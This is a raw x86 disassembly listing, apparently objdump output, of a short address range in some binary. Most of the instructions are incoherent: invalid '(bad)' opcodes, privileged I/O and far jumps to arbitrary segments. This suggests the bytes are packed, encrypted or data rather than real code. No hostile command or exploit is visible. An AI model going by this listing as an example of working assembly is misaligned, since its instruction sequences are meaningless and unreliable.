  41eea5:	mov    DWORD PTR [eax+0x6cef396f],0x29637bc2
  41eeaf:	sub    al,0x43
  41eeb1:	jb     0x41eeca
  41eeb3:	xor    bl,BYTE PTR [ecx+0x3b]
  41eeb6:	(bad)  
  41eeb7:	fist   DWORD PTR [ecx+eax*4-0x9e024f5]
  41eebe:	iret   
  41eebf:	(bad)  
  41eec1:	push   esi
  41eec2:	mov    edi,0x729fd894
  41eec7:	fwait
  41eec8:	into   
  41eec9:	jo     0x41ee79
  41eecb:	stos   BYTE PTR es:[edi],al
  41eecc:	mov    ah,0x88
  41eece:	sar    BYTE PTR [ebp+0x50],0x0
  41eed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed3:	hlt    
  41eed4:	sti    
  41eed5:	retf   0x387a
  41eed8:	stos   DWORD PTR es:[edi],eax
  41eed9:	retf   0x2ef7
  41eedc:	push   edx
  41eedd:	mov    eax,ds:0x6a7d795f
  41eee2:	es test eax,0xd0f79a03
  41eee8:	dec    ebx
  41eee9:	pusha  
  41eeea:	push   es
  41eeeb:	repnz sbb ah,BYTE PTR [eax]
  41eeee:	xor    BYTE PTR ds:0x2ad91d11,bh
  41eef4:	and    eax,0x44a89ce
  41eef9:	shl    BYTE PTR [edx+ebp*1-0x32],0x4e
  41eefe:	mov    edx,0x62c5f08f
  41ef03:	js     0x41ef2e
  41ef05:	js     0x41ef46
  41ef07:	inc    esp
  41ef08:	xor    bh,ch
  41ef0a:	jl     0x41ee92
  41ef0c:	jmp    0x7db5:0x32371b70
  41ef13:	ret    0xff30
  41ef16:	mov    ds:0x2db36c0e,eax
  41ef1b:	and    edi,DWORD PTR ss:[edi]
  41ef1e:	jnp    0x41eede
  41ef20:	inc    DWORD PTR [ebx]
  41ef22:	out    0x2f,al
  41ef24:	jne    0x41eed6
  41ef26:	or     esi,DWORD PTR [edx+0x15]
  41ef29:	xor    eax,DWORD PTR [ebp+0x2e]
  41ef2c:	sbb    ah,BYTE PTR [ebx+0x55]
  41ef2f:	add    BYTE PTR [ebx-0x40],ah
  41ef32:	data16 xchg BYTE PTR [ebx+edx*4],bl
  41ef36:	pop    ecx
  41ef37:	pusha  
  41ef38:	test   al,0x7d
  41ef3a:	(bad)  
  41ef3b:	std    
  41ef3c:	scas   al,BYTE PTR es:[edi]
  41ef3d:	ror    DWORD PTR [ecx+ecx*1],cl
  41ef40:	and    eax,0xbd3f75fb
  41ef45:	ret    
  41ef46:	jo     0x41eed0
  41ef48:	(bad)  
  41ef49:	(bad)  
  41ef4a:	(bad)  
  41ef4b:	mov    ebp,0x4db1e5ca
  41ef50:	iret   
  41ef51:	pop    esi
  41ef52:	fwait
  41ef53:	nop
  41ef54:	ins    BYTE PTR es:[edi],dx
  41ef55:	jmp    0xa7da:0x3e196577
  41ef5c:	pop    ecx
  41ef5d:	repz add eax,0x1c7561df
  41ef63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef64:	inc    esp
  41ef65:	test   BYTE PTR [eax-0x41],al
  41ef68:	xor    eax,0xb34d3f16
  41ef6d:	dec    ebx
  41ef6e:	xchg   esp,eax
  41ef6f:	mov    al,0x70
  41ef71:	dec    esi
  41ef72:	loope  0x41efa3
  41ef74:	int3   
  41ef75:	pop    ss
  41ef76:	aam    0xb9
  41ef78:	and    bh,bl
  41ef7a:	sar    DWORD PTR [esi-0x1f],cl
  41ef7d:	push   esp
  41ef7e:	xchg   esp,eax
  41ef7f:	push   ecx
  41ef80:	mov    dh,0xd0
  41ef82:	dec    edi
  41ef83:	mov    dl,0xc
  41ef85:	fcmovnbe st,st(4)
  41ef87:	sbb    ah,BYTE PTR [ecx+0x21f0235c]
  41ef8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef8e:	lock lods al,BYTE PTR ds:[esi]
  41ef90:	inc    esi
  41ef91:	cs retf 
  41ef93:	inc    esi
  41ef94:	mov    ah,0xdf
  41ef96:	or     DWORD PTR [esi+0xc],0x70
  41ef9a:	out    dx,eax
  41ef9b:	sbb    eax,DWORD PTR [ecx-0x382d0f57]
  41efa1:	(bad)  
  41efa2:	pop    ecx
  41efa3:	ja     0x41ef59
  41efa5:	lock dec ebx
  41efa7:	xchg   ebx,eax
  41efa8:	dec    ecx
  41efa9:	sbb    al,0x4a
  41efab:	jbe    0x41ef81
  41efad:	inc    ecx
  41efae:	sub    ebp,DWORD PTR [edi]
  41efb0:	mov    BYTE PTR [edi],cl
  41efb2:	mov    eax,0x95dd011b
  41efb7:	mov    esi,0xae2008c
  41efbc:	inc    ebp
  41efbd:	iret   
  41efbe:	shr    BYTE PTR [eax-0x66c4e3af],0xc5
  41efc5:	rcl    BYTE PTR [ebp+0xbcc06a5],1
  41efcb:	lds    ecx,FWORD PTR [esi+0x37cbb7f1]
  41efd1:	dec    ecx
  41efd2:	in     al,dx
  41efd3:	mov    eax,0x911c47a9
  41efd8:	loop   0x41ef64
  41efda:	dec    esi
  41efdb:	jl     0x41ef5f
  41efdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efde:	mov    cl,0x72
  41efe0:	mov    bh,0x8e
  41efe2:	loop   0x41effb
  41efe4:	xchg   DWORD PTR [edx+0x1a1666e8],ecx
  41efea:	gs clc 
  41efec:	or     al,0x3f
  41efee:	test   eax,0xc4d0f78c
  41eff3:	test   al,0xe8
  41eff5:	pop    esp
  41eff6:	shl    BYTE PTR [edi],cl
  41eff8:	or     DWORD PTR [ebp+0x732efe6d],esi
  41effe:	and    al,BYTE PTR [eax]
  41f000:	leave  
  41f001:	cs push edx
  41f003:	jmp    0x41f07d
  41f005:	retf   
  41f006:	les    ebp,FWORD PTR [edx+0x14]
  41f009:	or     DWORD PTR [eax+0x62],edi
  41f00c:	lea    ecx,[ecx+eax*1+0x1d]
  41f010:	xchg   esp,eax
  41f011:	inc    edi
  41f012:	data16 jo 0x41f00e
  41f015:	cdq    
  41f016:	ins    BYTE PTR es:[edi],dx
  41f017:	fnsave [ebp-0xa]
  41f01a:	add    BYTE PTR [eax+ebp*4+0x24],cl
  41f01e:	(bad)
  41f021:	retf   0x9c2c
  41f024:	add    DWORD PTR [edx-0x146b4e95],ecx
  41f02a:	sar    BYTE PTR [eax-0x1997af3a],1
  41f030:	sbb    al,0xe8
  41f032:	xchg   ebx,eax
  41f033:	cmp    dh,dl
  41f035:	iret   
  41f036:	ins    DWORD PTR es:[edi],dx
  41f037:	aaa    
  41f038:	ins    DWORD PTR es:[edi],dx
  41f039:	cmp    bl,BYTE PTR [ebx]
  41f03b:	or     al,0xb1
  41f03d:	xchg   esi,eax
  41f03e:	ss or  bl,dl
  41f041:	adc    ch,BYTE PTR [ebx-0x412e9079]
  41f047:	and    BYTE PTR [ecx],0x5a
  41f04a:	shl    BYTE PTR [ebp-0x5b],cl
  41f04d:	loope  0x41f0c5
  41f04f:	mov    eax,DWORD PTR [bp+di]
  41f052:	mov    edi,0x1008a972
  41f057:	and    esp,edi
  41f059:	aam    0xc4
  41f05b:	fcom   DWORD PTR [esi+0x567122c4]
  41f061:	pop    edi
  41f062:	inc    DWORD PTR [edi-0x3f664fa4]
  41f068:	sub    eax,DWORD PTR [ebp+0x3a4a8dd7]
  41f06e:	cmp    eax,0x7635fb0d
  41f073:	inc    ebp
  41f074:	lock call 0xbbf24251
  41f07a:	push   esi
  41f07b:	dec    ebx
  41f07c:	imul   esi,edi,0xffffff8b
  41f07f:	test   DWORD PTR [edx-0x78],0xfd6d2380
  41f086:	mov    cs,WORD PTR [ebx+0x23]
  41f089:	adc    al,0xd8
  41f08b:	sbb    eax,0x6c4b049b
  41f090:	inc    esi
  41f091:	sub    al,0x7b
  41f093:	pop    ebx
  41f094:	inc    edx
  41f095:	or     ch,dh
  41f097:	bound  edx,QWORD PTR [ecx]
  41f099:	out    0x75,eax
  41f09b:	into   
  41f09c:	inc    esp
  41f09d:	xchg   ebp,eax
  41f09e:	or     ah,BYTE PTR [esi]
  41f0a0:	cld    
  41f0a1:	jmp    0xae4a:0x22a61e76
  41f0a8:	fstp   DWORD PTR [esi+0x357d1187]
  41f0ae:	pop    ebx
  41f0af:	jbe    0x41f126
  41f0b1:	pop    ebx
  41f0b2:	test   dh,bh
  41f0b4:	into   
  41f0b5:	mov    ebp,0x394faab1
  41f0ba:	retf   0xfb04
  41f0bd:	out    0xd6,al
  41f0bf:	xor    al,0x50
  41f0c1:	xchg   edx,eax
  41f0c2:	xchg   esp,eax
  41f0c3:	jbe    0x41f115
  41f0c5:	xchg   esp,eax
  41f0c6:	xor    DWORD PTR [ebp+0x39],0xc40c4c5a
  41f0cd:	push   cs
  41f0ce:	jg     0x41f148
  41f0d0:	shl    DWORD PTR [ebx+0x2f23974e],1
  41f0d6:	cmp    eax,0xb88941fd
  41f0db:	jg     0x41f155
  41f0dd:	add    esi,ebp
  41f0df:	cli    
  41f0e0:	(bad)  
  41f0e1:	ret    0x8604
  41f0e4:	fwait
  41f0e5:	shr    BYTE PTR [ebp+0xb],cl
  41f0e8:	(bad)  
  41f0e9:	iret   
  41f0ea:	xlat   BYTE PTR ds:[ebx]
  41f0eb:	sbb    eax,0xedc87eb2
  41f0f0:	not    ebp
  41f0f2:	fcom   QWORD PTR [esi-0x22]
  41f0f5:	cmp    bl,BYTE PTR [edx+0x64]
  41f0f8:	push   ebx
  41f0f9:	pop    es
  41f0fa:	aaa    
  41f0fb:	jnp    0x41f16f
  41f0fd:	in     eax,0xcf
  41f0ff:	push   ds
  41f100:	mov    bl,0x69
  41f102:	push   0x7e
  41f104:	loop   0x41f166
  41f106:	aas    
  41f107:	sar    BYTE PTR [esi+0x78dd76b5],1
  41f10d:	or     dh,BYTE PTR [edi]
  41f10f:	rol    BYTE PTR [edx+0x20],1
  41f112:	xchg   edi,eax
  41f113:	out    dx,al
  41f114:	mov    edx,DWORD PTR [ecx]
  41f116:	lea    esi,[ebp-0x468060d2]
  41f11c:	inc    ebp
  41f11d:	mov    al,0x8c
  41f11f:	lahf   
  41f120:	ret    0x82c8
  41f123:	jle    0x41f0ca
  41f125:	push   0x69
  41f127:	sub    esi,DWORD PTR [edx+0x9]
  41f12a:	xor    al,0x34
  41f12c:	shl    DWORD PTR [ebx-0x3118e668],0xd1
  41f133:	mov    ds:0xae064cb4,al
  41f138:	lahf   
  41f139:	inc    ebp
  41f13a:	and    DWORD PTR [edi+0x7f31f3bd],edi
  41f140:	adc    ecx,esi
  41f142:	mov    dh,0x51
  41f144:	loop   0x41f154
  41f146:	std    
  41f147:	aas    
  41f148:	lods   eax,DWORD PTR ds:[esi]
  41f149:	ja     0x41f0e8
  41f14b:	ret    
  41f14c:	mov    ds:0x6d02267e,eax
  41f151:	sbb    eax,0xb078b34f
  41f156:	pushf  
  41f157:	dec    edi
  41f158:	push   es
  41f159:	push   0x26
  41f15b:	pop    DWORD PTR [edx+edx*4-0x3f8e9f80]
  41f162:	mov    al,0x6a
  41f164:	pop    ebx
  41f165:	sbb    eax,0xdd2c2217
  41f16a:	jg     0x41f12c
  41f16c:	sub    BYTE PTR ds:0x21731c1c,al
  41f172:	mov    ah,0xdf
  41f174:	jbe    0x41f1e4
  41f176:	mov    ah,0xd1
  41f178:	fmul   DWORD PTR [ecx-0x15]
  41f17b:	das    
  41f17c:	sub    bh,BYTE PTR [esi-0x77]
  41f17f:	pop    ecx
  41f180:	loop   0x41f122
  41f182:	in     eax,dx
  41f183:	sbb    eax,0xaca18e32
  41f188:	jmp    0xfe8e:0xd3f2d5d6
  41f18f:	mov    BYTE PTR [esi-0x2d],dl
  41f192:	push   0x7b
  41f194:	call   DWORD PTR [esi+0x47]
  41f197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f198:	aas    
  41f199:	and    eax,0xb3bc9fd5
  41f19e:	cmp    eax,0x1c8fb64d
  41f1a3:	popa   
  41f1a4:	cmp    eax,0x858de647
  41f1a9:	add    eax,0xc9b89eee
  41f1ae:	adc    al,0x81
  41f1b0:	mov    cl,0x55
  41f1b2:	cmp    ecx,DWORD PTR ds:0xd915f9e8
  41f1b8:	cmp    eax,0xbc34d35b
  41f1bd:	ins    BYTE PTR es:[edi],dx
  41f1be:	xchg   ecx,eax
  41f1bf:	out    0xc4,al
  41f1c1:	mov    eax,0xf18b8420
  41f1c6:	add    dh,0x81
  41f1c9:	xchg   edi,eax
  41f1ca:	add    eax,0x40562b9b
  41f1cf:	add    BYTE PTR [edx],cl
  41f1d1:	stos   BYTE PTR es:[edi],al
  41f1d2:	dec    ebp
  41f1d3:	jno    0x41f21c
  41f1d5:	mov    dh,0x55
  41f1d7:	xchg   esp,eax
  41f1d8:	mov    cl,0x47
  41f1da:	xchg   esi,eax
  41f1db:	inc    ebp
  41f1dc:	inc    esp
  41f1dd:	cdq    
  41f1de:	pop    esi
  41f1df:	jg     0x41f1e8
  41f1e1:	sbb    dh,BYTE PTR ds:0xfa9de33d
  41f1e7:	mov    bh,0x99
  41f1e9:	and    eax,esp
  41f1eb:	jne    0x41f1ae
  41f1ed:	cmc    
  41f1ee:	popf   
  41f1ef:	fnsave [edx+0x11c9164e]
  41f1f5:	neg    BYTE PTR [ebx+0x61]
  41f1f8:	es push edi
  41f1fa:	cmc    
  41f1fb:	dec    ebp
  41f1fc:	mov    ?,WORD PTR [ebp+0x42]
  41f1ff:	aaa    
  41f200:	lods   al,BYTE PTR ds:[esi]
  41f201:	and    DWORD PTR [edx+ebx*1+0x392b2596],ecx
  41f208:	mov    dl,0x23
  41f20a:	xor    DWORD PTR [ebx+edi*8-0x78],edx
  41f20e:	das    
  41f20f:	or     al,0xad
  41f211:	push   cs
  41f212:	nop
  41f213:	popa   
  41f214:	pop    ds
  41f215:	shr    WORD PTR [eax],1
  41f218:	popf   
  41f219:	pop    ss
  41f21a:	lods   al,BYTE PTR ds:[esi]
  41f21b:	add    ebp,esi
  41f21d:	cmp    al,0x13
  41f21f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f220:	ds mov esp,0x75a107b0
  41f226:	add    BYTE PTR ds:0x10ffc138,bh
  41f22c:	mov    esi,0x9f184916
  41f231:	jae    0x41f202
  41f233:	repnz lea edi,[esi-0x36]
  41f237:	les    esp,FWORD PTR [ebx]
  41f239:	(bad)  
  41f23a:	mov    dh,BYTE PTR [esi-0xa]
  41f23d:	sti    
  41f23e:	mov    eax,0xb06b84fd
  41f243:	sbb    DWORD PTR [ebp+0x52],edi
  41f246:	dec    ebx
  41f247:	inc    ebp
  41f248:	cmp    BYTE PTR [ecx],ch
  41f24a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f24b:	leave  
  41f24c:	xchg   edi,eax
  41f24d:	pop    ecx
  41f24e:	xor    eax,0x6c511529
  41f253:	je     0x41f29e
  41f255:	pop    ebx
  41f256:	push   edi
  41f257:	push   ds
  41f258:	xchg   edi,eax
  41f259:	mov    ecx,0x4b2ccbd6
  41f25e:	retf   0x17f7
  41f261:	xchg   edx,eax
  41f262:	adc    eax,esi
  41f264:	or     BYTE PTR [edi-0x4e],dh
  41f267:	mov    al,ds:0x77cac30f
  41f26c:	aam    0xde
  41f26e:	pop    edx
  41f26f:	sbb    al,0xc
  41f271:	(bad)  [ebp-0x37]
  41f274:	and    al,0x24
  41f276:	push   esi
  41f277:	data16 jne 0x41f234
  41f27a:	ins    BYTE PTR es:[edi],dx
  41f27b:	arpl   WORD PTR [ecx-0x15761b4d],bx
  41f281:	int    0x17
  41f283:	lds    eax,FWORD PTR ds:0xd9ee17c4
  41f289:	push   edx
  41f28a:	sbb    edi,eax
  41f28c:	or     bh,ch
  41f28e:	hlt    
  41f28f:	out    0x3e,eax
  41f291:	adc    DWORD PTR [esi],ebp
  41f293:	push   cs
  41f294:	cli    
  41f295:	mov    cs,ebp
  41f297:	aam    0xa2
  41f299:	xchg   BYTE PTR [esi+0x218d3c0],ah
  41f29f:	mov    ds:0x4bbe5cfd,al
  41f2a4:	jg     0x41f23a
  41f2a6:	clc    
  41f2a7:	inc    esp
  41f2a8:	mov    dh,0x2a
  41f2aa:	das    
  41f2ab:	mov    ebp,0x568fa4b0
  41f2b0:	jbe    0x41f29a
  41f2b2:	jne    0x41f2b1
  41f2b4:	dec    edi
  41f2b5:	cmp    al,0xf2
  41f2b7:	xchg   ecx,eax
  41f2b8:	sbb    al,0x55
  41f2ba:	xchg   ecx,eax
  41f2bb:	in     eax,0x10
  41f2bd:	sbb    DWORD PTR [ebx-0x4db036f2],esp
  41f2c3:	cmp    eax,0xf5936ed4
  41f2c8:	sbb    al,0xed
  41f2ca:	sbb    edx,ecx
  41f2cc:	aad    0xc1
  41f2ce:	mov    bh,0x20
  41f2d0:	jno    0x41f2c8
  41f2d2:	sub    BYTE PTR [eax+edx*8],0x62
  41f2d6:	retf   
  41f2d7:	idiv   DWORD PTR [ebp+0x3c69188d]
  41f2dd:	test   al,0x11
  41f2df:	fwait
  41f2e0:	or     BYTE PTR ds:0x29c37c9,al
  41f2e6:	inc    esi
  41f2e7:	ror    DWORD PTR gs:[ebp+0x1d],1
  41f2eb:	cmp    ebx,ecx
  41f2ed:	mov    bh,0xc9
  41f2ef:	xor    dl,BYTE PTR [eax]
  41f2f1:	retf   0xc221
  41f2f4:	or     dh,BYTE PTR [ecx-0x354ec02d]
  41f2fa:	jmp    0x3cd5f852
  41f2ff:	cmp    bl,dh
  41f301:	push   0xffffffcf
  41f303:	jmp    0x46e9:0x85287e5f
  41f30a:	cmp    eax,0x20957a8a
  41f30f:	sbb    dh,cl
  41f311:	sub    eax,0x20c31dcd
  41f316:	lods   eax,DWORD PTR ds:[esi]
  41f317:	stos   DWORD PTR es:[edi],eax
  41f318:	cs pop esp
  41f31a:	les    eax,FWORD PTR [edx+eiz*4]
  41f31d:	dec    esp
  41f31e:	add    DWORD PTR [ebx+ebp*1-0x52c23172],esp
  41f325:	mov    edx,0x711a3fa3
  41f32a:	jmp    0xc91:0xfd52f715
  41f331:	imul   ebx,DWORD PTR [edi-0x230e0aba],0xffffffca
  41f338:	sub    edi,DWORD PTR [eax]
  41f33a:	push   ds
  41f33b:	sbb    DWORD PTR [esi+0x21],ebp
  41f33e:	pop    ds
  41f33f:	xor    al,0x50
  41f341:	xchg   dl,bh
  41f343:	pop    ss
  41f344:	mov    WORD PTR [ebp+eax*1+0x535409e9],cs
  41f34b:	std    
  41f34c:	cmp    dh,BYTE PTR [esi]
  41f34e:	lea    edi,[edi-0x38d4cedf]
  41f354:	js     0x41f3c3
  41f356:	frstor ds:0x3dae159a
  41f35c:	test   BYTE PTR [ebp-0x56dd68dc],bh
  41f362:	and    BYTE PTR [ebx+0x50],bl
  41f365:	dec    eax
  41f366:	fcomp  QWORD PTR [esi]
  41f368:	jg     0x41f380
  41f36a:	loopne 0x41f398
  41f36c:	retf   
  41f36d:	mov    ds:0x50cb34e5,al
  41f372:	push   eax
  41f373:	mov    ebx,0xc024668c
  41f378:	std    
  41f379:	pop    ebp
  41f37a:	pusha  
  41f37b:	sub    esp,ebp
  41f37d:	lahf   
  41f37e:	inc    edx
  41f37f:	(bad)  [edx-0x3e87c273]
  41f385:	mov    edi,0x110e6c53
  41f38a:	or     al,0x27
  41f38c:	ins    DWORD PTR es:[edi],dx
  41f38d:	cmp    DWORD PTR [esi+0x5bfeb056],esi
  41f393:	pushf  
  41f394:	mov    esp,0xd9362ad
  41f399:	xor    eax,0xb3ec9454
  41f39e:	aas    
  41f39f:	test   eax,0x8a1f0ddb
  41f3a4:	aad    0x1c
  41f3a6:	pushf  
  41f3a7:	nop
  41f3a8:	nop
  41f3a9:	lahf   
  41f3aa:	sbb    cl,BYTE PTR [ebp+0x42]
  41f3ad:	jle    0x41f35f
  41f3af:	jmp    0xa8378a67
  41f3b4:	test   DWORD PTR ds:0xbb44e400,edx
  41f3ba:	test   eax,0x1711fe6d
  41f3bf:	test   eax,0x15dafd65
  41f3c4:	popa   
  41f3c5:	and    eax,0xfe533178
  41f3ca:	and    bl,BYTE PTR [ebx+0x72d4af10]
  41f3d0:	sub    al,0x9
  41f3d2:	das    
  41f3d3:	adc    al,0x39
  41f3d5:	out    dx,al
  41f3d6:	add    BYTE PTR [edx-0xf],0x11
  41f3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3db:	mov    al,0xce
  41f3dd:	icebp  
  41f3de:	jns    0x41f45d
  41f3e0:	fisttp WORD PTR [eax-0x59]
  41f3e3:	loope  0x41f37f
  41f3e5:	cwde   
  41f3e6:	mov    ch,ah
  41f3e8:	cmp    DWORD PTR [esi+esi*4-0x46],esp
  41f3ec:	add    DWORD PTR [eax],ebx
  41f3ee:	clc    
  41f3ef:	fmul   DWORD PTR [edx+0x46]
  41f3f2:	int3   
  41f3f3:	cs lock sar al,cl
  41f3f7:	jmp    0x36a2:0x39e8eeb0
  41f3fe:	stos   DWORD PTR es:[edi],eax
  41f3ff:	mov    ebx,0xf443ba2b
  41f404:	ret    0x5175
  41f407:	sub    BYTE PTR [esi],bh
  41f409:	ror    cl,cl
  41f40b:	adc    esp,DWORD PTR [ebx]
  41f40d:	xlat   BYTE PTR ds:[ebx]
  41f40e:	push   ss
  41f40f:	xchg   esi,eax
  41f410:	gs cli 
  41f412:	jb     0x41f445
  41f414:	inc    esi
  41f415:	pusha  
  41f416:	fwait
  41f417:	out    0x75,eax
  41f419:	arpl   WORD PTR [esi],sp
  41f41b:	loop   0x41f448
  41f41d:	xor    edx,eax
  41f41f:	jae    0x41f468
  41f421:	stos   DWORD PTR es:[edi],eax
  41f422:	pop    esp
  41f423:	std    
  41f424:	iret   
  41f425:	popa   
  41f426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f427:	stos   DWORD PTR es:[edi],eax
  41f428:	outs   dx,DWORD PTR ds:[esi]
  41f429:	fidiv  WORD PTR [ecx+edx*1-0x10]
  41f42d:	mov    cl,0xeb
  41f42f:	add    BYTE PTR [ecx+ebx*8+0x2eb7745f],cl
  41f436:	mov    bl,0xe5
  41f438:	lods   eax,DWORD PTR ds:[esi]
  41f439:	add    dh,BYTE PTR cs:[eax+0x4970a229]
  41f440:	sbb    al,0xcd
  41f442:	push   ecx
  41f443:	ret    0x5de1
  41f446:	(bad)  
  41f447:	cld    
  41f448:	addr16 xchg ebx,eax
  41f44a:	cmp    esi,DWORD PTR [edx+0x79]
  41f44d:	in     eax,0xdc
  41f44f:	pushf  
  41f450:	(bad)  
  41f451:	dec    DWORD PTR [ebp-0x7c]
  41f454:	je     0x41f40d
  41f456:	sbb    eax,0x3806965
  41f45b:	jae    0x90560
  41f461:	jle    0x41f409
  41f463:	popf   
  41f464:	leave  
  41f465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f466:	mov    edx,0x2506127b
  41f46b:	jmp    0xfe1e:0xae690093
  41f472:	mov    cl,bl
  41f474:	or     al,0xb1
  41f476:	mov    eax,ds:0x9e1a8bb3
  41f47b:	(bad)  
  41f47c:	cmp    esi,edx
  41f47e:	std    
  41f47f:	sub    BYTE PTR gs:[edi-0x70],ah
  41f483:	aaa    
  41f484:	lahf   
  41f485:	bound  edi,QWORD PTR [ecx+eax*8+0xa2f469]
  41f48c:	lods   al,BYTE PTR ds:[esi]
  41f48d:	dec    ebp
  41f48e:	(bad)  
  41f48f:	lods   al,BYTE PTR ds:[esi]
  41f490:	add    al,0x63
  41f492:	or     edx,DWORD PTR [eax-0x39828de6]
  41f498:	lods   eax,DWORD PTR ds:[esi]
  41f499:	jno    0x41f4c8
  41f49b:	and    DWORD PTR [eax+0x54efc732],edi
  41f4a1:	push   ss
  41f4a2:	dec    ecx
  41f4a3:	push   eax
  41f4a4:	out    dx,eax
  41f4a5:	std    
  41f4a6:	fiadd  WORD PTR [edx+0x1c]
  41f4a9:	stc    
  41f4aa:	jo     0x41f482
  41f4ac:	imul   eax,DWORD PTR [esi+0x6799a678],0x53
  41f4b3:	mov    ch,0x76
  41f4b5:	neg    BYTE PTR [eax+esi*2+0x2a]
  41f4b9:	inc    esi
  41f4ba:	stc    
  41f4bb:	xor    bl,BYTE PTR [ebp-0x1e]
  41f4be:	stos   DWORD PTR es:[edi],eax
  41f4bf:	jg     0x41f46e
  41f4c1:	test   ecx,ebx
  41f4c3:	neg    ah
  41f4c5:	rcr    DWORD PTR es:[ebx-0x52ba9b96],1
  41f4cc:	jmp    DWORD PTR [edx]
  41f4ce:	dec    esi
  41f4cf:	enter  0x1bab,0x79
  41f4d3:	sahf   
  41f4d4:	jle    0x41f470
  41f4d6:	stos   DWORD PTR es:[edi],eax
  41f4d7:	inc    edx
  41f4d8:	cs scas eax,DWORD PTR es:[edi]
  41f4da:	mov    esp,0x3dae4592
  41f4df:	push   esp
  41f4e0:	call   0xdc68306
  41f4e5:	rcr    BYTE PTR [edi-0xc4dae08],0xb2
  41f4ec:	cmc    
  41f4ed:	cmp    edi,DWORD PTR [edi-0x7abd9602]
  41f4f3:	adc    eax,0x24b75892
  41f4f8:	cmc    
  41f4f9:	scas   al,BYTE PTR es:[edi]
  41f4fa:	cmp    ebx,edi
  41f4fc:	hlt    
  41f4fd:	xor    al,0xf6
  41f4ff:	inc    esi
  41f500:	aaa    
  41f501:	cmp    DWORD PTR [esp+edx*2-0x21],0xb5f9c9e3
  41f509:	inc    edi
  41f50a:	lds    esi,FWORD PTR ds:0xf5a79b20
  41f510:	or     dl,bh
  41f512:	inc    esi
  41f513:	hlt    
  41f514:	pop    ds
  41f515:	gs daa 
  41f517:	push   eax
  41f518:	adc    al,0xa9
  41f51a:	test   DWORD PTR [ebx+esi*1],esp
  41f51d:	xor    cl,cl
  41f51f:	arpl   WORD PTR [edx+0x39],di
  41f522:	mov    gs,esi
  41f524:	xor    al,0x12
  41f526:	xor    esp,DWORD PTR [eax+ebx*1-0x3c2a932f]
  41f52d:	and    bh,BYTE PTR [edi-0x346f5870]
  41f533:	cdq    
  41f534:	rcr    BYTE PTR [ebp-0x26],0xfc
  41f538:	mov    eax,ds:0x8aa27e2e
  41f53d:	(bad)  
  41f53f:	jecxz  0x41f5a0
  41f541:	fwait
  41f542:	add    bl,BYTE PTR [esi-0x28]
  41f545:	in     al,0x95
  41f547:	cmp    ch,al
  41f549:	or     DWORD PTR [ecx+0xfe6622a],esp
  41f54f:	ins    DWORD PTR es:[edi],dx
  41f550:	xchg   ch,dl
  41f552:	aaa    
  41f553:	mov    ds:0x8106ba45,eax
  41f558:	push   cs
  41f559:	repz dec esp
  41f55b:	sub    eax,edi
  41f55d:	dec    ebx
  41f55e:	adc    eax,0xb299c561
  41f563:	xor    al,0xf3
  41f565:	out    dx,al
  41f566:	jnp    0x41f58c
  41f568:	mov    al,0xb2
  41f56a:	lahf   
  41f56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f56c:	push   ebp
  41f56d:	xlat   BYTE PTR ds:[ebx]
  41f56e:	lds    edi,FWORD PTR ds:0x3d18a33f
  41f574:	out    0x59,eax
  41f576:	push   ebx
  41f577:	into   
  41f578:	leave  
  41f579:	stos   DWORD PTR es:[edi],eax
  41f57a:	cwde   
  41f57b:	fs jmp 0x41f5a7
  41f57e:	sub    DWORD PTR [edx+0x5e],0xffffffc7
  41f582:	mov    eax,ds:0x5613fffc
  41f587:	dec    eax
  41f588:	inc    edx
  41f589:	xor    ecx,ecx
  41f58b:	dec    ecx
  41f58c:	addr16 js 0x41f53f
  41f58f:	out    dx,eax
  41f590:	mov    esi,eax
  41f592:	dec    edx
  41f593:	in     al,0x96
  41f595:	call   0xdccaa7fc
  41f59a:	push   eax
  41f59b:	ror    BYTE PTR [esi-0x6d94aab3],cl
  41f5a1:	sbb    edi,edx
  41f5a3:	xchg   ecx,eax
  41f5a4:	in     eax,dx
  41f5a5:	push   ebx
  41f5a6:	lea    ebp,[ebx-0x52]
  41f5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5aa:	and    cl,BYTE PTR [eax-0x33b55af0]
  41f5b0:	(bad)  
  41f5b1:	shr    cl,1
  41f5b3:	(bad)  
  41f5b4:	hlt    
  41f5b5:	gs pushfw 
  41f5b8:	push   esi
  41f5b9:	mov    ds:0x2493483f,eax
  41f5be:	std    
  41f5bf:	pop    ds
  41f5c0:	add    eax,0xe4f58532
  41f5c5:	pop    eax
  41f5c6:	xor    DWORD PTR [eax+0x16],esp
  41f5c9:	repz and al,0x1c
  41f5cc:	sbb    BYTE PTR cs:[ecx],bl
  41f5cf:	sbb    bh,BYTE PTR [eiz*8+0x4a65f08d]
  41f5d6:	sub    eax,0x991019c3
  41f5db:	jge    0x41f56f
  41f5dd:	cdq    
  41f5de:	dec    esi
  41f5df:	cmp    BYTE PTR [edx-0x7],bl
  41f5e2:	jle    0x41f56d
  41f5e4:	bound  eax,QWORD PTR [ebp-0x2b]
  41f5e7:	shl    BYTE PTR fs:[eax],cl
  41f5ea:	adc    al,BYTE PTR [edi]
  41f5ec:	adc    al,0x3e
  41f5ee:	sub    bl,BYTE PTR [ebp-0x1031d116]
  41f5f4:	imul   edx,DWORD PTR [edx-0x52],0x28
  41f5f8:	test   BYTE PTR ds:[edi],ch
  41f5fb:	cmc    
  41f5fc:	fstp   TBYTE PTR [eax]
  41f5fe:	int3   
  41f5ff:	jmp    FWORD PTR [eax]
  41f601:	mul    DWORD PTR [eax+0x52d221bc]
  41f607:	push   edi
  41f608:	retf   0x9267
  41f60b:	cmp    BYTE PTR [edi-0x3b234ca5],dl
  41f611:	out    0x80,al
  41f613:	mov    ch,0xb0
  41f615:	and    eax,0x59076213
  41f61a:	push   ds
  41f61b:	loope  0x41f61b
  41f61d:	test   DWORD PTR [edx+0x6d9dd806],0x4fd9716e
  41f627:	jmp    DWORD PTR [edx-0x3a30b0f6]
